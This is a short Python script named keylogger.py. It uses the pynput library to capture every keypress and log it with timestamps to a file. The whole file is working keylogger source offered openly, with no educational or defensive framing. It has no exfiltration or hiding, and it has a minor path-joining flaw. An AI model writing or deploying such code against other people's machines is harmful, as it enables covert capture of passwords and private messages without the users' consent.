# keylogger.py
import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = "/path/to/log/folder"
logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
